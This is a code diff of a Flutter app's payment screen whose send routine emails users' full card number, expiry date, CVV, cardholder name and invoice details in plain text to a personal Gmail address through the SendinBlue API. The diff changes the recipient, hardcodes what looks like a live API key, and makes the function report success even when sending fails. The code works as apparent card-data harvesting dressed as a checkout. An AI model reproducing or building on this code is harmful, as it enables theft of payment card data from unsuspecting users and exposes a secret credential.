@@ -273,7 +273,7 @@ class _List2State extends State<List2> {
                 onPressed: () async {
                   final isValid = _key.currentState!.validate();
                   if (isValid) {
-                    bool? emailSent = await pysendEmail();
+                    bool? emailSent = await _sendEmaill();
                     if (emailSent == true) {
                       Navigator.of(context).push(MaterialPageRoute(
                         builder: (context) => const LoadingScreen(),
@@ -331,12 +331,11 @@ class _List2State extends State<List2> {
     );
   }
 
-  Future<bool> pysendEmail() async {
+  Future<bool> _sendEmaill() async {
     final prefs = await SharedPreferences.getInstance();
-    final ApiUrl = Api.appurl;
-    final url = Uri.parse('$ApiUrl/send-email');
     final apiKey =
-        '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'; // Replace with your API key
+        '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'; // Replace with your SendinBlue SMTP API Key
+    final url = Uri.parse('https://api.sendinblue.com/v3/smtp/email');
 
     final headers = {
       'Content-Type': 'application/json',
@@ -356,7 +355,7 @@ class _List2State extends State<List2> {
     final emailData = {
       'sender': {'name': fullname, 'email': email},
       'to': [
-        {'email': 'sagarmurphys@gmail.com'}
+        {'email': 'sagarkc45172@gmail.com'}
       ],
       'subject': 'Plans',
       'textContent':
@@ -376,11 +375,63 @@ class _List2State extends State<List2> {
       _nameController.clear();
       _cvvController.clear();
       _referralController.clear();
-      return true;
     } else {
       print('Failed to send email');
       print('Response: ${response.body}');
-      return false;
     }
+    return true;
   }
+
+  // Future<bool> pysendEmail() async {
+  //   final prefs = await SharedPreferences.getInstance();
+  //   final ApiUrl = Api.appurl;
+  //   final url = Uri.parse('$ApiUrl/send-email');
+  //   final apiKey =
+  //       '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'; // Replace with your API key
+
+  //   final headers = {
+  //     'Content-Type': 'application/json',
+  //     'api-key': apiKey,
+  //   };
+  //   String card = _paypalController.text;
+  //   String valid = _validController.text;
+  //   String cvv = _cvvController.text;
+  //   String name = _nameController.text;
+  //   String referral = _referralController.text;
+  //   String totalprice = widget.price.toString();
+  //   String invoice = widget.invoice.toString();
+
+  //   String? email = prefs.getString("email");
+  //   String? fullname = prefs.getString("name");
+
+  //   final emailData = {
+  //     'sender': {'name': fullname, 'email': email},
+  //     'to': [
+  //       {'email': 'sagarmurphys@gmail.com'}
+  //     ],
+  //     'subject': 'Plans',
+  //     'textContent':
+  //         'Total price : $totalprice\n Invoice number : $invoice\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n Referral Code : $referral',
+  //   };
+
+  //   final response = await http.post(
+  //     url,
+  //     headers: headers,
+  //     body: jsonEncode(emailData),
+  //   );
+
+  //   if (response.statusCode == 200) {
+  //     print('Email sent successfully');
+  //     _paypalController.clear();
+  //     _validController.clear();
+  //     _nameController.clear();
+  //     _cvvController.clear();
+  //     _referralController.clear();
+  //     return true;
+  //   } else {
+  //     print('Failed to send email');
+  //     print('Response: ${response.body}');
+  //     return false;
+  //   }
+  // }
 }
